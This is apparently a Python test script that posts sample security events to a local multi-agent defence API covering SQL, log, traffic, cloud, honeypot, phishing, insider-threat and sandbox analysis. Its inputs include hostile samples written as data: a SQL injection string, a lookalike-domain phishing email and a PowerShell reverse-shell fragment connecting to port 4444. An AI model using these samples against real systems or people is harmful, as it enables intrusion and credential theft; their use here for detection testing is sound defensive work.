import requests
import json
import time

BASE_URL = "http://localhost:8000/api"

def test_db_guard():
    print("--- Testing DB Guard Agent ---")
    query = "SELECT * FROM users WHERE username = 'admin' OR 1=1; --"
    try:
        response = requests.post(f"{BASE_URL}/analyze/db", json={"query": query})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_log_guard():
    print("\n--- Testing Log Guard Agent ---")
    log_entry = "2023-10-27 10:15:22 - Multiple failed login attempts for user 'admin' from IP 192.168.1.100"
    try:
        response = requests.post(f"{BASE_URL}/analyze/log", json={"log_entry": log_entry})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_watcher_guard():
    print("\n--- Testing Watcher Agent (Network Guard) ---")
    traffic_log = "09:42:15.123 192.168.1.5 -> 10.0.0.1 TCP 443 SYN_SENT (Repeated 5000 times in 2 seconds)"
    try:
        response = requests.post(f"{BASE_URL}/analyze/traffic", json={"traffic_log": traffic_log})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_cloud_guard():
    print("\n--- Testing Cloud Guard Agent ---")
    cloud_audit_log = {
        "eventSource": "s3.amazonaws.com",
        "eventName": "PutBucketAcl",
        "userIdentity": {"type": "Root", "principalId": "123456789012"},
        "requestParameters": {
            "bucketName": "company-confidential-data",
            "AccessControlPolicy": "PublicReadWrite"
        }
    }
    try:
        response = requests.post(f"{BASE_URL}/analyze/cloud", json={"cloud_audit_log": cloud_audit_log})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_active_defense_pipeline():
    print("\n--- Testing Active Defense Pipeline (Watcher -> IR Agent) ---")
    traffic_log = "09:42:15.123 192.168.1.5 -> 10.0.0.1 TCP 443 SYN_SENT (Repeated 5000 times in 2 seconds)"
    
    print("[1] Watcher Agent scanning traffic...")
    try:
        watcher_response = requests.post(f"{BASE_URL}/analyze/traffic", json={"traffic_log": traffic_log}).json()
        print(f"    Threat Detected: {watcher_response.get('attack_type')} from log.")
        
        if watcher_response.get("status") == "DANGEROUS":
            print("[2] Threat is CRITICAL. Pushing report to Incident Response Agent...")
            ir_response = requests.post(f"{BASE_URL}/respond", json={"threat_report": watcher_response}).json()
            
            print(f"    [IR AGENT ACTION]: {ir_response.get('mitigation_summary')}")
            print(f"    [TARGET]: {ir_response.get('target')}")
            print(f"    [WINDOWS COMMAND]: {ir_response.get('windows_command')}")
            print(f"    [LINUX COMMAND]: {ir_response.get('linux_command')}")
            print(f"    [STATUS]: {ir_response.get('execution_status')}")
            
    except Exception as e:
        print(f"Error Pipeline: {e}")

def test_honeypot_guard():
    print("\n--- Testing Honeypot Agent ---")
    honeypot_log = "Connection from 203.0.113.42. Attempted default credentials: root/toor on fake SSH port 2222."
    try:
        response = requests.post(f"{BASE_URL}/analyze/honeypot", json={"honeypot_interaction": honeypot_log})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_vuln_scanner():
    print("\n--- Testing Vulnerability Scanner Agent ---")
    system_config = "Ubuntu 20.04 LTS, Apache 2.4.49, OpenSSH 8.2p1, Java 8 (log4j-core-2.14.0.jar)"
    try:
        response = requests.post(f"{BASE_URL}/analyze/vuln", json={"system_config": system_config})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_threat_intel():
    print("\n--- Testing Threat Intel Agent ---")
    indicator = "192.168.1.5 (Consistent SYN floods mirroring 2022 GitHub DDOS attack patterns)"
    try:
        response = requests.post(f"{BASE_URL}/analyze/intel", json={"indicator": indicator})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_reporting_agent():
    print("\n--- Testing Reporting Agent ---")
    mock_logs = [
        {"timestamp": "10:42", "agent": "Watcher", "action": "Detected DDoS from 192.168.1.5"},
        {"timestamp": "10:43", "agent": "IR_Agent", "action": "Blocked 192.168.1.5 via iptables"},
        {"timestamp": "10:45", "agent": "ThreatIntel", "action": "Mapped 192.168.1.5 to Mirai Botnet"}
    ]
    try:
        response = requests.post(f"{BASE_URL}/report", json={"incident_logs": mock_logs})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_deadman_switch():
    print("\n--- Testing Dead Man Switch (Zero Day Lockdown) ---")
    try:
        response = requests.post(f"{BASE_URL}/lockdown", json={"trigger_signal": "MASSIVE BREACH VERIFIED. ROOT COMPROMISED. DEPLOY COUNTERMEASURES."})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_ueba_agent():
    print("\n--- Testing UEBA Agent (Insider Threat) ---")
    log = "User 'sarah.connor' accessed 45GB of Salesforce HR data and attempted to transfer it via USB at 03:15 AM."
    try:
        response = requests.post(f"{BASE_URL}/analyze/ueba", json={"user_activity_log": log})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_phishing_agent():
    print("\n--- Testing Phishing Security Agent ---")
    email = "URGENT: Your Office365 password expires in 2 hours. Click here to reset: http://login-microsoft-secure-auth.com/reset"
    try:
        response = requests.post(f"{BASE_URL}/analyze/phishing", json={"email_content": email})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

def test_sandbox_agent():
    print("\n--- Testing Sandbox Static Code Analyzer ---")
    script = "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.5', 4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};"
    try:
        response = requests.post(f"{BASE_URL}/analyze/sandbox", json={"malware_code": script})
        print(f"Status Code: {response.status_code}")
        print(json.dumps(response.json(), indent=4))
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    print("Ensure you have the server running in another terminal (python main.py)\n")
    test_db_guard()
    time.sleep(2)
    test_log_guard()
    time.sleep(2)
    test_watcher_guard()
    time.sleep(2)
    test_cloud_guard()
    time.sleep(2)
    test_honeypot_guard()
    time.sleep(2)
    test_vuln_scanner()
    time.sleep(2)
    test_active_defense_pipeline()
    time.sleep(2)
    test_threat_intel()
    time.sleep(2)
    test_reporting_agent()
    time.sleep(2)
    test_deadman_switch()
    time.sleep(2)
    test_ueba_agent()
    time.sleep(2)
    test_phishing_agent()
    time.sleep(2)
    test_sandbox_agent()
